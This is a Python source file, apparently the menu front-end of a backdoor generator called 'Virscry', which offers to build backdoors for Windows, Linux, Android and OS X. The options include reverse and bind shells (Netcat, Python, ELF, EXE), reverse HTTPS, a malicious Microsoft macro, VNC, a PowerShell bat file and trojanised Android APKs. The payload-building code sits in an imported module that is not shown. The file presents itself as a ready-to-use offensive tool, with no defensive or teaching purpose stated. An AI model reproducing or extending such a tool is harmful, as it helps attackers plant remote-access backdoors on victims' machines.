import colorama
from colorama import Fore, Style
import os
from shell import *

try:
    os.system('clear')
    res = True
    banner = '''
    ██▒   █▓ ██▓ ██▀███   ▄████▄   ██▀███ ▓██   ██▓
    ▓██░   █▒▓██▒▓██ ▒ ██▒▒██▀ ▀█  ▓██ ▒ ██▒▒██  ██▒
    ▓██  █▒░▒██▒▓██ ░▄█ ▒▒▓█    ▄ ▓██ ░▄█ ▒ ▒██ ██░
    ▒██ █░░░██░▒██▀▀█▄  ▒▓▓▄ ▄██▒▒██▀▀█▄   ░ ▐██▓░
    ▒▀█░  ░██░░██▓ ▒██▒▒ ▓███▀ ░░██▓ ▒██▒ ░ ██▒▓░
    ░ ▐░  ░▓  ░ ▒▓ ░▒▓░░ ░▒ ▒  ░░ ▒▓ ░▒▓░  ██▒▒▒ 
    ░ ░░   ▒ ░  ░▒ ░ ▒░  ░  ▒     ░▒ ░ ▒░▓██ ░▒░ 
        ░░   ▒ ░  ░░   ░ ░          ░░   ░ ▒ ▒ ░░  
        ░   ░     ░     ░ ░         ░     ░ ░     
        ░                ░                 ░ ░     
                                        by Elieren
    '''
    
    while res:
        print(Fore.GREEN + banner + Fore.YELLOW)
        print(Fore.YELLOW + 'Create backdoor for:')
        print()
        print('1) Windows')
        print('2) linux')
        print('3) Android')
        print('4) OS X')
    
        platform = str(input(': '))
        ret = 1

        if platform == '1':
            while ret == 1:
                os.system('clear')
                print(Fore.GREEN + banner + Fore.YELLOW)
                print()
                print('[1] Bind Shell')
                print('[2] Reverse Shell')
                print('[3] Reverse HTTPS')
                print('[4] Bind Shell (Netcat)')
                print('[5] Reverse Shell (Netcat)')
                print('[6] Microsoft macro')
                print('[7] Vnc')
                print('[8] PowerShell (bat)')
                print('[9] Execut (exe)')
                print('[10] Reverse Shell (Python)')
                print('[11] Bind Shell (Python)')
                print('[0] Exit')
                nam = int(input(': '))
                if nam != 0:
                    a = windows(nam)
                    if a == 1:
                        res = False
                        ret = 0
                    else:
                        pass
                else:
                    ret = 0

        elif platform == '2':
            while ret == 1:
                os.system('clear')
                print(Fore.GREEN + banner + Fore.YELLOW)
                print()
                print('[1] Reverse Shell (elf)')
                print('[2] Reverse Shell (Python)')
                print('[3] Bind Shell (elf)')
                print('[4] Execut (elf)')
                print('[5] Bind Shell (Python)')
                print('[0] Exit')
                nam = int(input(': '))
                if nam != 0:
                    a = linux(nam)
                    if a == 1:
                        res = False
                        ret = 0
                    else:
                        pass
                else:
                    ret = 0

        elif platform == '3':
            while ret == 1:
                os.system('clear')
                print(Fore.GREEN + banner + Fore.YELLOW)
                print()
                print('[1] Create apk')
                print('[2] Backdoor apk original (gui)')
                print('[0] Exit')
                nam = int(input(': '))
                if nam != 0:
                    a = android(nam)
                    if a == 1:
                        res = False
                        ret = 0
                    else:
                        pass
                else:
                    ret = 0

        elif platform == '4':
            while ret == 1:
                os.system('clear')
                print(Fore.GREEN + banner + Fore.YELLOW)
                print()
                print('[1] Reverse Shell')
                print('[2] Bind Shell')
                print('[3] Execut')
                print('[4] Reverse Shell (Python)')
                print('[5] Bind Shell (Python)')
                print('[0] Exit')
                nam = int(input(': '))
                if nam != 0:
                    a = mac(nam)
                    if a == 1:
                        res = False
                        ret = 0
                    else:
                        pass
                else:
                    ret = 0
        
        else:
            pass
        os.system('clear')

except:
    print('Good bye.')